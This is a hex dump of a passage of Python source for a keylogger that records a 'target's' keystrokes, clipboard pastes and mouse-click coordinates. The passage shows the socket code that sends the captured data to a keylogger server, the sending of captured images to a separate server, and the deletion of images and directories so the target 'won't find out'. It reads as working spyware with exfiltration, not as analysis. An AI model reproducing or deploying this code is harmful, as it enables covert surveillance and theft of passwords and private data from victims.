+000012d0: 6f63 6b65 742e 736f 636b 6574 2873 6f63  ocket.socket(soc
+000012e0: 6b65 742e 4146 5f49 4e45 542c 2073 6f63  ket.AF_INET, soc
+000012f0: 6b65 742e 534f 434b 5f53 5452 4541 4d29  ket.SOCK_STREAM)
+00001300: 0d0a 0d0a 2020 2020 2020 2020 7472 793a  ....        try:
+00001310: 0d0a 2020 2020 2020 2020 2020 2020 666f  ..            fo
+00001320: 7220 7820 696e 2072 616e 6765 287a 6569  r x in range(zei
+00001330: 7420 2b20 3129 3a0d 0a20 2020 2020 2020  t + 1):..       
+00001340: 2020 2020 2020 2020 2069 6620 7820 3d3d           if x ==
+00001350: 2032 303a 0d0a 2020 2020 2020 2020 2020   20:..          
+00001360: 2020 2020 2020 2020 2020 7365 6c66 2e61            self.a
+00001370: 6c6c 5f64 6972 2829 0d0a 2020 2020 2020  ll_dir()..      
+00001380: 2020 2020 2020 2020 2020 2020 2020 2320                # 
+00001390: 5468 6973 2066 756e 6374 696f 6e20 6d61  This function ma
+000013a0: 6b65 7320 3130 3020 6669 6c65 7320 746f  kes 100 files to
+000013b0: 2073 746f 7265 2074 6865 2069 6d61 6765   store the image
+000013c0: 2073 6f20 7468 6520 7461 7267 6574 2077   so the target w
+000013d0: 6f6e 2774 2066 696e 6420 6f75 740d 0a20  on't find out.. 
+000013e0: 2020 2020 2020 2020 2020 2020 2020 2070                 p
+000013f0: 7269 6e74 2878 290d 0a20 2020 2020 2020  rint(x)..       
+00001400: 2020 2020 2020 2020 207a 6569 7420 2d3d           zeit -=
+00001410: 2031 0d0a 2020 2020 2020 2020 2020 2020   1..            
+00001420: 2020 2020 7469 6d65 2e73 6c65 6570 2831      time.sleep(1
+00001430: 290d 0a20 2020 2020 2020 2020 2020 2020  )..             
+00001440: 2020 2069 6620 7820 696e 2073 6563 6f6e     if x in secon
+00001450: 6473 5f6c 6973 743a 0d0a 2020 2020 2020  ds_list:..      
+00001460: 2020 2020 2020 2020 2020 2020 2020 7365                se
+00001470: 6c66 2e63 6c69 656e 7428 6970 5f70 686f  lf.client(ip_pho
+00001480: 746f 732c 2070 6f72 745f 7068 6f74 6f73  tos, port_photos
+00001490: 290d 0a20 2020 2020 2020 2020 2020 2020  )..             
+000014a0: 2020 2020 2020 2023 2054 6865 2069 6d61         # The ima
+000014b0: 6765 7320 7769 6c6c 2062 6520 7365 6e74  ges will be sent
+000014c0: 0d0a 2020 2020 2020 2020 2020 2020 6b65  ..            ke
+000014d0: 795f 6461 7461 2e63 6f6e 6e65 6374 2828  y_data.connect((
+000014e0: 6970 5f6b 6579 6c6f 6767 6572 2c20 706f  ip_keylogger, po
+000014f0: 7274 5f6b 6579 6c6f 6767 6572 2929 0d0a  rt_keylogger))..
+00001500: 2020 2020 2020 2020 2020 2020 2320 5468              # Th
+00001510: 6973 2069 7320 7468 6520 6970 2061 6e64  is is the ip and
+00001520: 2074 6865 2070 6f72 7420 6f66 2074 6865   the port of the
+00001530: 2073 6572 7665 7220 7468 6520 706f 7274   server the port
+00001540: 2073 686f 756c 646e 2774 2062 6520 7468   shouldn't be th
+00001550: 6520 7361 6d65 2074 6865 2073 6572 7665  e same the serve
+00001560: 725f 7068 6f74 6f73 2061 6e64 2074 6865  r_photos and the
+00001570: 2073 6572 7665 725f 6b65 796c 6f67 6765   server_keylogge
+00001580: 7220 7368 6f75 6c64 6e27 7420 6265 0d0a  r shouldn't be..
+00001590: 2020 2020 2020 2020 2020 2020 2320 696e              # in
+000015a0: 2074 6865 2073 616d 6520 666f 6c64 6572   the same folder
+000015b0: 0d0a 2020 2020 2020 2020 2020 2020 7365  ..            se
+000015c0: 6c66 2e63 6f6f 7264 696e 6174 6573 203d  lf.coordinates =
+000015d0: 206c 6973 7428 7365 7428 7365 6c66 2e63   list(set(self.c
+000015e0: 6f6f 7264 696e 6174 6573 2929 0d0a 2020  oordinates))..  
+000015f0: 2020 2020 2020 2020 2020 2320 5468 6973            # This
+00001600: 2063 6865 636b 7320 6966 2074 6865 2063   checks if the c
+00001610: 6f6f 7264 696e 6174 6573 206f 6363 7572  oordinates occur
+00001620: 2032 2074 696d 6573 0d0a 2020 2020 2020   2 times..      
+00001630: 2020 2020 2020 7072 696e 7428 7365 6c66        print(self
+00001640: 2e63 6f6f 7264 696e 6174 6573 290d 0a20  .coordinates).. 
+00001650: 2020 2020 2020 2020 2020 2077 6f72 7420             wort 
+00001660: 3d20 2222 0d0a 2020 2020 2020 2020 2020  = ""..          
+00001670: 2020 666f 7220 7a65 6963 6865 6e20 696e    for zeichen in
+00001680: 2073 656c 662e 7269 6368 7469 6765 5f6c   self.richtige_l
+00001690: 6973 7465 3a0d 0a20 2020 2020 2020 2020  iste:..         
+000016a0: 2020 2020 2020 2077 6f72 7420 2b3d 207a         wort += z
+000016b0: 6569 6368 656e 0d0a 0d0a 2020 2020 2020  eichen....      
+000016c0: 2020 2020 2020 2320 5365 6e64 7320 7468        # Sends th
+000016d0: 6520 6461 7461 2074 6f20 7365 7276 6572  e data to server
+000016e0: 5f6b 6579 6c6f 6767 6572 0d0a 2020 2020  _keylogger..    
+000016f0: 2020 2020 2020 2020 616c 6c5f 6461 7461          all_data
+00001700: 203d 2073 7472 2873 656c 662e 636f 6f72   = str(self.coor
+00001710: 6469 6e61 7465 7329 202b 2077 6f72 740d  dinates) + wort.
+00001720: 0a20 2020 2020 2020 2020 2020 2023 2043  .            # C
+00001730: 6f6f 7264 696e 6174 6573 2061 6e64 206b  oordinates and k
+00001740: 6579 6461 7461 2061 7265 2062 6569 6e67  eydata are being
+00001750: 2063 6f6e 6361 7465 6e61 7465 640d 0a20   concatenated.. 
+00001760: 2020 2020 2020 2020 2020 206b 6579 5f64             key_d
+00001770: 6174 612e 7365 6e64 2861 6c6c 5f64 6174  ata.send(all_dat
+00001780: 612e 656e 636f 6465 2829 290d 0a20 2020  a.encode())..   
+00001790: 2020 2020 2020 2020 2070 7269 6e74 2877           print(w
+000017a0: 6f72 7429 0d0a 2020 2020 2020 2020 2020  ort)..          
+000017b0: 2020 7072 696e 7428 7365 6c66 2e72 6963    print(self.ric
+000017c0: 6874 6967 655f 6c69 7374 6529 0d0a 2020  htige_liste)..  
+000017d0: 2020 2020 2020 2020 2020 6668 616e 646c            fhandl
+000017e0: 652e 636c 6f73 6528 290d 0a20 2020 2020  e.close()..     
+000017f0: 2020 2020 2020 2023 2043 6c6f 7365 7320         # Closes 
+00001800: 7468 6520 696d 6167 650d 0a20 2020 2020  the image..     
+00001810: 2020 2020 2020 206f 732e 7265 6d6f 7665         os.remove
+00001820: 2822 496d 6167 652e 706e 6722 290d 0a20  ("Image.png").. 
+00001830: 2020 2020 2020 2020 2020 2023 2044 656c             # Del
+00001840: 6574 6573 2074 6865 2069 6d61 6765 2069  etes the image i
+00001850: 6e20 7468 6520 6375 7272 656e 7420 6469  n the current di
+00001860: 7265 6374 6f72 790d 0a20 2020 2020 2020  rectory..       
+00001870: 2020 2020 206f 732e 6368 6469 7228 222e       os.chdir(".
+00001880: 2e22 290d 0a20 2020 2020 2020 2020 2020  .")..           
+00001890: 2023 2057 6520 6861 7665 2074 6f20 676f   # We have to go
+000018a0: 2062 6163 6b20 736f 2074 6861 7420 7765   back so that we
+000018b0: 2063 616e 2064 656c 6574 6520 7468 6520   can delete the 
+000018c0: 6f74 6865 7220 6469 7265 6374 6f72 6965  other directorie
+000018d0: 730d 0a20 2020 2020 2020 2020 2020 2066  s..            f
+000018e0: 6f72 2065 6163 685f 6469 7220 696e 2072  or each_dir in r
+000018f0: 616e 646f 6d5f 6c73 743a 0d0a 2020 2020  andom_lst:..    
+00001900: 2020 2020 2020 2020 2020 2020 7368 7574              shut
+00001910: 696c 2e72 6d74 7265 6528 6561 6368 5f64  il.rmtree(each_d
+00001920: 6972 290d 0a20 2020 2020 2020 2020 2020  ir)..           
+00001930: 2020 2020 2023 2054 6869 7320 6465 6c65       # This dele
+00001940: 7465 7320 6576 6572 7920 6469 7265 6374  tes every direct
+00001950: 6f72 790d 0a20 2020 2020 2020 2020 2020  ory..           
+00001960: 2073 7973 2e65 7869 7428 290d 0a20 2020   sys.exit()..   
+00001970: 2020 2020 2020 2020 2023 2053 746f 7073           # Stops
+00001980: 2074 6865 206b 6579 6c6f 6767 6572 0d0a   the keylogger..
+00001990: 2020 2020 2020 2020 6578 6365 7074 204b          except K
+000019a0: 6579 626f 6172 6449 6e74 6572 7275 7074  eyboardInterrupt
+000019b0: 3a0d 0a20 2020 2020 2020 2020 2020 2023  :..            #
+000019c0: 2049 6620 7468 6520 7461 7267 6574 2068   If the target h
+000019d0: 6173 2064 6573 7472 6f79 6564 2074 6865  as destroyed the
+000019e0: 2063 6f6e 6e65 6374 696f 6e0d 0a20 2020   connection..   
+000019f0: 2020 2020 2020 2020 2077 6f72 7420 3d20           wort = 
+00001a00: 222a 2a2a 25c2 a7c2 a729 c2a7 c2a7 2522  "***%....)....%"
+00001a10: 0d0a 2020 2020 2020 2020 2020 2020 2320  ..            # 
+00001a20: 5468 6973 2069 7320 6c69 6b65 2061 2073  This is like a s
+00001a30: 7065 6369 616c 2063 6f64 652e 2054 6f20  pecial code. To 
+00001a40: 7370 6c69 7420 6974 2061 7420 7468 6520  split it at the 
+00001a50: 656e 640d 0a20 2020 2020 2020 2020 2020  end..           
+00001a60: 2066 6f72 207a 6569 6368 656e 2069 6e20   for zeichen in 
+00001a70: 7365 6c66 2e72 6963 6874 6967 655f 6c69  self.richtige_li
+00001a80: 7374 653a 0d0a 2020 2020 2020 2020 2020  ste:..          
+00001a90: 2020 2020 2020 776f 7274 202b 3d20 7a65        wort += ze
+00001aa0: 6963 6865 6e0d 0a20 2020 2020 2020 2020  ichen..         
+00001ab0: 2020 2069 6620 7365 6c66 2e63 6f6f 7264     if self.coord
+00001ac0: 696e 6174 6573 3a0d 0a20 2020 2020 2020  inates:..       
+00001ad0: 2020 2020 2020 2020 2077 6f72 7420 2b3d           wort +=
+00001ae0: 2073 7472 2873 656c 662e 636f 6f72 6469   str(self.coordi
+00001af0: 6e61 7465 7329 0d0a 2020 2020 2020 2020  nates)..        
+00001b00: 2020 2020 6461 7461 203d 2066 2254 4845      data = f"THE
+00001b10: 2043 4f4e 4e45 4354 494f 4e20 4841 5320   CONNECTION HAS 
+00001b20: 4245 454e 2049 4e54 4552 5255 5054 4544  BEEN INTERRUPTED
+00001b30: 7b77 6f72 747d 220d 0a20 2020 2020 2020  {wort}"..       
+00001b40: 2020 2020 2023 2054 6869 7320 6c65 7427       # This let'
+00001b50: 7320 7468 6520 7365 7276 6572 206b 6e6f  s the server kno
+00001b60: 7720 7468 6174 2074 6865 2073 6572 7665  w that the serve
+00001b70: 7220 7368 6f75 6c64 2073 6875 7420 646f  r should shut do
+00001b80: 776e 0d0a 2020 2020 2020 2020 2020 2020  wn..            
+00001b90: 6b65 795f 6461 7461 2e63 6f6e 6e65 6374  key_data.connect
+00001ba0: 2828 6970 5f6b 6579 6c6f 6767 6572 2c20  ((ip_keylogger, 
+00001bb0: 706f 7274 5f6b 6579 6c6f 6767 6572 2929  port_keylogger))
+00001bc0: 0d0a 2020 2020 2020 2020 2020 2020 6b65  ..            ke
+00001bd0: 795f 6461 7461 2e73 656e 6428 6461 7461  y_data.send(data
+00001be0: 2e65 6e63 6f64 6528 2929 0d0a 2020 2020  .encode())..    
+00001bf0: 2020 2020 2020 2020 6b65 795f 6461 7461          key_data
+00001c00: 2e63 6c6f 7365 2829 0d0a 0d0a 2020 2020  .close()....    
+00001c10: 2020 2020 2020 2020 6966 206f 732e 7061          if os.pa
+00001c20: 7468 2e65 7869 7374 7328 2249 6d61 6765  th.exists("Image
+00001c30: 2e70 6e67 2229 3a0d 0a20 2020 2020 2020  .png"):..       
+00001c40: 2020 2020 2020 2020 2023 2049 7420 7769           # It wi
+00001c50: 6c6c 2064 6573 7472 6f79 2074 6865 2069  ll destroy the i
+00001c60: 6d61 6765 2073 6f20 7461 7267 6574 2077  mage so target w
+00001c70: 6f75 6e64 206b 6e6f 7720 616e 7974 6869  ound know anythi
+00001c80: 6e67 0d0a 2020 2020 2020 2020 2020 2020  ng..            
+00001c90: 2020 2020 6668 616e 646c 652e 636c 6f73      fhandle.clos
+00001ca0: 6528 290d 0a0d 0a20 2020 2020 2020 2020  e()....         
+00001cb0: 2020 206e 6577 5f73 6572 7665 7220 3d20     new_server = 
+00001cc0: 736f 636b 6574 2e73 6f63 6b65 7428 736f  socket.socket(so
+00001cd0: 636b 6574 2e41 465f 494e 4554 2c20 736f  cket.AF_INET, so
+00001ce0: 636b 6574 2e53 4f43 4b5f 5354 5245 414d  cket.SOCK_STREAM
+00001cf0: 290d 0a20 2020 2020 2020 2020 2020 206e  )..            n
+00001d00: 6577 5f73 6572 7665 722e 636f 6e6e 6563  ew_server.connec
+00001d10: 7428 2822 3132 372e 302e 302e 3122 2c20  t(("127.0.0.1", 
+00001d20: 3130 3737 2929 0d0a 2020 2020 2020 2020  1077))..        
+00001d30: 2020 2020 6e65 775f 7365 7276 6572 2e73      new_server.s
+00001d40: 656e 6428 2264 6f6e 6522 2e65 6e63 6f64  end("done".encod
+00001d50: 6528 2929 0d0a 2020 2020 2020 2020 2020  e())..          
+00001d60: 2020 6e65 775f 7365 7276 6572 2e63 6c6f    new_server.clo
+00001d70: 7365 2829 0d0a 0d0a 0d0a 0d0a 2020 2020  se()........    
+00001d80: 6465 6620 6b69 6c6c 5f73 7769 7463 6828  def kill_switch(
+00001d90: 7365 6c66 293a 0d0a 2020 2020 2020 2020  self):..        
+00001da0: 2320 5468 6973 2066 756e 6374 696f 6e20  # This function 
+00001db0: 6465 7374 726f 7973 2074 6865 206d 6f75  destroys the mou
+00001dc0: 7365 2069 6e66 6f0d 0a20 2020 2020 2020  se info..       
+00001dd0: 206e 6577 5f73 6563 6f6e 6473 203d 2073   new_seconds = s
+00001de0: 656c 662e 6475 7261 7469 6f6e 202b 2035  elf.duration + 5
+00001df0: 0d0a 2020 2020 2020 2020 2320 3230 2073  ..        # 20 s
+00001e00: 6563 6f6e 6473 2061 7265 2062 6569 6e67  econds are being
+00001e10: 2061 6464 6564 2062 6563 6175 7365 2074   added because t
+00001e20: 6865 7265 206d 6967 6874 2062 6520 6120  here might be a 
+00001e30: 7072 6f62 6c65 6d0d 0a20 2020 2020 2020  problem..       
+00001e40: 2066 6f72 2078 2069 6e20 7261 6e67 6528   for x in range(
+00001e50: 6e65 775f 7365 636f 6e64 7329 3a0d 0a20  new_seconds):.. 
+00001e60: 2020 2020 2020 2020 2020 2074 696d 652e             time.
+00001e70: 736c 6565 7028 3129 0d0a 2020 2020 2020  sleep(1)..      
+00001e80: 2020 2320 5468 6973 2073 746f 7065 7320    # This stopes 
+00001e90: 7468 650d 0a20 2020 2020 2020 2073 7973  the..        sys
+00001ea0: 2e65 7869 7428 290d 0a0d 0a20 2020 2064  .exit()....    d
+00001eb0: 6566 206f 6e5f 636c 6963 6b28 7365 6c66  ef on_click(self
+00001ec0: 2c20 782c 2079 2c20 6275 7474 6f6e 2c20  , x, y, button, 
+00001ed0: 7072 6573 7365 6429 3a0d 0a20 2020 2020  pressed):..     
+00001ee0: 2020 2023 2054 6869 7320 6973 2074 6865     # This is the
+00001ef0: 2063 6c69 636b 2066 756e 6374 696f 6e0d   click function.
+00001f00: 0a20 2020 2020 2020 2070 7269 6e74 2866  .        print(f
+00001f10: 2254 6172 6765 7420 6861 7320 7072 6573  "Target has pres
+00001f20: 7365 6420 7b78 7d20 616e 6420 7b79 7d22  sed {x} and {y}"
+00001f30: 290d 0a20 2020 2020 2020 2023 2041 6c6c  )..        # All
+00001f40: 2074 6865 2063 6f6f 7264 696e 6174 6573   the coordinates
+00001f50: 2077 696c 6c20 6265 2073 746f 7265 6420   will be stored 
+00001f60: 696e 2022 7365 6c66 2e63 6f6f 7264 696e  in "self.coordin
+00001f70: 6174 6573 220d 0a20 2020 2020 2020 2073  ates"..        s
+00001f80: 656c 662e 636f 6f72 6469 6e61 7465 732e  elf.coordinates.
+00001f90: 6170 7065 6e64 2828 782c 2079 2929 0d0a  append((x, y))..
+00001fa0: 0d0a 2020 2020 6465 6620 616c 6c5f 636c  ..    def all_cl
+00001fb0: 6963 6b73 2873 656c 6629 3a0d 0a20 2020  icks(self):..   
+00001fc0: 2020 2020 2023 2054 6869 7320 6973 206a       # This is j
+00001fd0: 7573 7420 6120 6675 6e63 7469 6f6e 2073  ust a function s
+00001fe0: 6f20 6974 2063 616e 2062 6520 7261 6e20  o it can be ran 
+00001ff0: 7769 7468 2074 6872 6561 6469 6e67 0d0a  with threading..
+00002000: 2020 2020 2020 2020 7769 7468 204c 6973          with Lis
+00002010: 7465 6e65 7228 6f6e 5f63 6c69 636b 3d73  tener(on_click=s
+00002020: 656c 662e 6f6e 5f63 6c69 636b 2920 6173  elf.on_click) as
+00002030: 206c 6973 7465 6e69 6e67 3a0d 0a20 2020   listening:..   
+00002040: 2020 2020 2020 2020 2073 656c 662e 6b69           self.ki
+00002050: 6c6c 5f73 7769 7463 6828 290d 0a20 2020  ll_switch()..   
+00002060: 2020 2020 2020 2020 206c 6973 7465 6e69           listeni
+00002070: 6e67 2e6a 6f69 6e28 290d 0a0d 0a20 2020  ng.join()....   
+00002080: 2064 6566 2063 6f70 795f 6461 7461 2873   def copy_data(s
+00002090: 656c 6629 3a0d 0a20 2020 2020 2020 2073  elf):..        s
+000020a0: 656c 662e 7269 6368 7469 6765 5f6c 6973  elf.richtige_lis
+000020b0: 7465 2e61 7070 656e 6428 2220 2843 4f50  te.append(" (COP
+000020c0: 5920 2853 7472 672b 6329 2920 2229 0d0a  Y (Strg+c)) ")..
+000020d0: 0d0a 2020 2020 6465 6620 6170 7065 6e64  ..    def append
+000020e0: 5f70 6173 7465 2873 656c 6629 3a0d 0a20  _paste(self):.. 
+000020f0: 2020 2020 2020 2064 6174 6120 3d20 6622         data = f"
+00002100: 2028 7b70 7970 6572 636c 6970 2e70 6173   ({pyperclip.pas
+00002110: 7465 2829 7d20 7c20 5041 5354 4520 2853  te()} | PASTE (S
+00002120: 7472 672b 7629 2920 7c20 220d 0a20 2020  trg+v)) | "..   
+00002130: 2020 2020 2073 656c 662e 7269 6368 7469       self.richti
+00002140: 6765 5f6c 6973 7465 2e61 7070 656e 6428  ge_liste.append(
+00002150: 6461 7461 290d 0a0d 0a20 2020 2064 6566  data)....    def
+00002160: 2070 7269 6e74 5f77 6f72 6b28 7365 6c66   print_work(self
+00002170: 2c20 776f 7264 293a 0d0a 2020 2020 2020  , word):..      
+00002180: 2020 7072 696e 7428 6627 416c 7068 6162    print(f'Alphab
+00002190: 6574 6963 206b 6579 2077 6173 2070 7265  etic key was pre
+000021a0: 7373 6564 3a20 7b77 6f72 647d 2027 290d  ssed: {word} ').
+000021b0: 0a20 2020 2020 2020 2073 656c 662e 7269  .        self.ri
+000021c0: 6368 7469 6765 5f6c 6973 7465 202b 3d20  chtige_liste += 
+000021d0: 776f 7264 0d0a 2020 2020 2020 2020 2320  word..        # 
+000021e0: 4576 6572 7920 7072 6573 7365 6420 6b65  Every pressed ke
+000021f0: 7920 7769 6c6c 2062 6520 7361 7665 6420  y will be saved 
+00002200: 696e 2022 7269 6368 7469 6765 5f6c 6973  in "richtige_lis
+00002210: 7465 2220 7468 6973 2069 7320 6120 6765  te" this is a ge
+00002220: 726d 616e 2073 656c 662e 776f 7264 2061  rman self.word a
+00002230: 6e64 206d 6561 6e73 2022 7269 6768 745f  nd means "right_
+00002240: 6c69 7374 220d 0a0d 0a20 2020 2064 6566  list"....    def
+00002250: 206f 6e5f 7072 6573 7328 7365 6c66 2c20   on_press(self, 
+00002260: 6b65 7929 3a0d 0a20 2020 2020 2020 2074  key):..        t
+00002270: 7279 3a0d 0a20 2020 2020 2020 2020 2020  ry:..           
+00002280: 2074 7279 3a0d 0a20 2020 2020 2020 2020   try:..         
+00002290: 2020 2020 2020 206f 7468 6572 5f63 6861         other_cha
+000022a0: 7265 6374 6572 7320 3d20 7b22 3122 3a20  recters = {"1": 
+000022b0: 2221 222c 2022 3222 3a20 2722 272c 2022  "!", "2": '"', "
+000022c0: 3322 3a20 22c2 a722 2c20 2234 223a 2022  3": "..", "4": "
+000022d0: 2422 2c20 2235 223a 2022 2522 2c20 2236  $", "5": "%", "6
+000022e0: 223a 2022 2622 2c20 2237 223a 2022 2f22  ": "&", "7": "/"
+000022f0: 2c20 2238 223a 2022 2822 2c0d 0a20 2020  , "8": "(",..   
+00002300: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002310: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002320: 2022 3922 3a20 2229 222c 2022 3022 3a20   "9": ")", "0": 
+00002330: 223d 222c 2022 c39f 223a 2022 3f22 7d0d  "=", "..": "?"}.
+00002340: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00002350: 2069 6620 7365 6c66 2e63 6170 7320 6973   if self.caps is
+00002360: 2054 7275 653a 0d0a 2020 2020 2020 2020   True:..        
+00002370: 2020 2020 2020 2020 2020 2020 6966 206b              if k
+00002380: 6579 2e63 6861 7220 696e 206f 7468 6572  ey.char in other
+00002390: 5f63 6861 7265 6374 6572 733a 0d0a 2020  _charecters:..  
+000023a0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000023b0: 2020 2020 2020 7365 6c66 2e77 6f72 6420        self.word 
+000023c0: 3d20 6f74 6865 725f 6368 6172 6563 7465  = other_charecte
+000023d0: 7273 5b6b 6579 2e63 6861 725d 0d0a 2020  rs[key.char]..  
+000023e0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000023f0: 2020 2020 2020 2320 5570 7065 7220 4368        # Upper Ch
+00002400: 6172 6163 7465 7273 2066 726f 6d20 2231  aracters from "1
+00002410: 2220 746f 2022 3022 2062 6563 6175 7365  " to "0" because
+00002420: 2061 6c6c 2074 6869 7320 6e75 6d62 6572   all this number
+00002430: 7320 6172 6520 6e6f 7420 6368 6172 6563  s are not charec
+00002440: 7465 7273 2061 7265 206e 6f74 2069 6e20  ters are not in 
+00002450: 7079 6e70 7574 0d0a 2020 2020 2020 2020  pynput..        
+00002460: 2020 2020 2020 2020 2020 2020 656c 7365              else
+00002470: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
+00002480: 2020 2020 2020 2020 2020 2073 656c 662e             self.
+00002490: 776f 7264 203d 206b 6579 2e63 6861 722e  word = key.char.
+000024a0: 7570 7065 7228 290d 0a20 2020 2020 2020  upper()..       
+000024b0: 2020 2020 2020 2020 2065 6c73 653a 0d0a           else:..
+000024c0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000024d0: 2020 2020 7365 6c66 2e77 6f72 6420 3d20      self.word = 
+000024e0: 6b65 792e 6368 6172 0d0a 0d0a 2020 2020  key.char....    
+000024f0: 2020 2020 2020 2020 2020 2020 616c 6c5f              all_
+00002500: 7265 715f 6b65 7973 203d 207b 2203 223a  req_keys = {".":
+00002510: 2073 656c 662e 636f 7079 5f64 6174 612c   self.copy_data,
+00002520: 2022 1622 3a20 7365 6c66 2e61 7070 656e   ".": self.appen
+00002530: 645f 7061 7374 657d 0d0a 2020 2020 2020  d_paste}..      
+00002540: 2020 2020 2020 2020 2020 2320 2245 5458            # "ETX
+00002550: 2220 7374 616e 6473 2066 6f72 2022 456e  " stands for "En
+00002560: 642d 5465 7874 2d63 6861 7261 6374 6572  d-Text-character
+00002570: 2220 616e 6420 6973 2061 2063 6f6e 7472  " and is a contr
+00002580: 6f6c 2063 6861 7261 6374 6572 2077 6869  ol character whi
+00002590: 6368 206b 6e6f 7773 2074 6865 2063 6861  ch knows the cha
+000025a0: 7261 6374 6572 206f 6620 636f 7079 696e  racter of copyin
+000025b0: 6720 736f 6d65 7468 696e 6720 6f6e 2074  g something on t
+000025c0: 6865 206b 6579 626f 6172 640d 0a20 2020  he keyboard..   
+000025d0: 2020 2020 2020 2020 2020 2020 2023 2022               # "
+000025e0: 5359 4e22 2073 7461 6e64 7320 666f 7220  SYN" stands for 
+000025f0: 2253 796e 6368 726f 6e6f 7573 2049 646c  "Synchronous Idl
+00002600: 6522 2061 6e64 2069 7320 6120 636f 6e74  e" and is a cont
+00002610: 726f 6c20 6368 6172 6163 7465 7220 7768  rol character wh
+00002620: 6963 6820 6b6e 6f77 7320 7468 6520 6368  ich knows the ch
+00002630: 6172 6163 7465 7220 6f66 2070 6173 7469  aracter of pasti
+00002640: 6e67 2073 6f6d 6574 6869 6e67 206f 6e20  ng something on 
+00002650: 7468 6520 6b65 7962 6f61 7264 0d0a 2020  the keyboard..  
+00002660: 2020 2020 2020 2020 2020 2020 2020 666f                fo
+00002670: 7220 6561 6368 5f6b 6579 2069 6e20 616c  r each_key in al
+00002680: 6c5f 7265 715f 6b65 7973 3a0d 0a20 2020  l_req_keys:..   
+00002690: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000026a0: 2069 6620 6561 6368 5f6b 6579 203d 3d20   if each_key == 
+000026b0: 6b65 792e 6368 6172 3a0d 0a20 2020 2020  key.char:..     
+000026c0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000026d0: 2020 2023 2049 6620 7468 6520 636f 7079     # If the copy
+000026e0: 2063 6861 7261 6374 6572 2069 7320 7072   character is pr
+000026f0: 6573 7365 642c 2065 6163 6820 6675 6e63  essed, each func
+00002700: 7469 6f6e 206f 6620 6561 6368 2063 6861  tion of each cha
+00002710: 7261 6374 6572 2077 696c 6c20 6265 2077  racter will be w
+00002720: 6f72 6b69 6e67 0d0a 2020 2020 2020 2020  orking..        
+00002730: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002740: 616c 6c5f 7265 715f 6b65 7973 5b65 6163  all_req_keys[eac
+00002750: 685f 6b65 795d 2829 0d0a 2020 2020 2020  h_key]()..      
+00002760: 2020 2020 2020 2020 2020 7472 793a 0d0a            try:..
+00002770: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002780: 2020 2020 6173 6369 5f6e 756d 6265 7220      asci_number 
+00002790: 3d20 6f72 6428 7365 6c66 2e77 6f72 6429  = ord(self.word)
+000027a0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+000027b0: 2020 2020 2020 2320 4f72 6469 6e61 6c20        # Ordinal 
+000027c0: 6e75 6d62 6572 2069 6e20 7468 6520 7261  number in the ra
+000027d0: 6e67 6520 6f66 2030 2074 6f20 3331 2063  nge of 0 to 31 c
+000027e0: 6f6d 706c 6574 6573 2061 6c6c 2073 7065  ompletes all spe
+000027f0: 6369 616c 2063 6861 7261 6374 6572 7320  cial characters 
+00002800: 7769 7468 2074 6865 206b 6579 2022 7374  with the key "st
+00002810: 7267 202b 206c 6574 7465 7222 0d0a 2020  rg + letter"..  
+00002820: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002830: 2020 6966 2061 7363 695f 6e75 6d62 6572    if asci_number
+00002840: 206e 6f74 2069 6e20 7261 6e67 6528 302c   not in range(0,
+00002850: 2033 3229 3a0d 0a20 2020 2020 2020 2020   32):..         
+00002860: 2020 2020 2020 2020 2020 2020 2020 2023                 #
+00002870: 2069 6620 7468 6572 6520 6973 206e 6f20   if there is no 
+00002880: 7370 6563 6961 6c20 6368 6172 6163 7465  special characte
+00002890: 7220 6974 206a 7573 7420 7072 696e 7473  r it just prints
+000028a0: 2074 6865 2061 6c70 6861 6265 7469 6320   the alphabetic 
+000028b0: 6e75 6d62 6572 0d0a 2020 2020 2020 2020  number..        
+000028c0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000028d0: 7365 6c66 2e70 7269 6e74 5f77 6f72 6b28  self.print_work(
+000028e0: 7365 6c66 2e77 6f72 6429 0d0a 0d0a 2020  self.word)....  
+000028f0: 2020 2020 2020 2020 2020 2020 2020 6578                ex
+00002900: 6365 7074 2054 7970 6545 7272 6f72 3a0d  cept TypeError:.
+00002910: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00002920: 2020 2020 2023 2070 7269 6e74 7320 7468       # prints th
+00002930: 6520 616c 7068 6162 6574 6320 6e75 6d62  e alphabetc numb
+00002940: 6572 0d0a 2020 2020 2020 2020 2020 2020  er..            
+00002950: 2020 2020 2020 2020 7365 6c66 2e70 7269          self.pri
+00002960: 6e74 5f77 6f72 6b28 7365 6c66 2e77 6f72  nt_work(self.wor
+00002970: 6429 0d0a 0d0a 2020 2020 2020 2020 2020  d)....          
+00002980: 2020 2020 2020 7072 696e 7428 7365 6c66        print(self
+00002990: 2e72 6963 6874 6967 655f 6c69 7374 6529  .richtige_liste)
+000029a0: 0d0a 2020 2020 2020 2020 2020 2020 6578  ..            ex
+000029b0: 6365 7074 2054 7970 6545 7272 6f72 3a0d  cept TypeError:.
+000029c0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+000029d0: 2070 6173 730d 0a0d 0a20 2020 2020 2020   pass....       
+000029e0: 2065 7863 6570 7420 4174 7472 6962 7574   except Attribut
+000029f0: 6545 7272 6f72 3a0d 0a20 2020 2020 2020  eError:..       
+00002a00: 2020 2020 2070 7269 6e74 2866 2741 6e20       print(f'An 
+00002a10: 6f74 6865 7220 6b65 7920 7761 7320 7072  other key was pr
+00002a20: 6573 7365 643a 207b 6b65 797d 2729 0d0a  essed: {key}')..
+00002a30: 2020 2020 2020 2020 2020 2020 6966 206b              if k
+00002a40: 6579 203d 3d20 6b65 7962 6f61 7264 2e4b  ey == keyboard.K
+00002a50: 6579 2e73 7061 6365 206f 7220 6b65 7920  ey.space or key 
+00002a60: 3d3d 206b 6579 626f 6172 642e 4b65 792e  == keyboard.Key.
+00002a70: 7461 623a 0d0a 2020 2020 2020 2020 2020  tab:..          
+00002a80: 2020 2020 2020 7365 6c66 2e72 6963 6874        self.richt
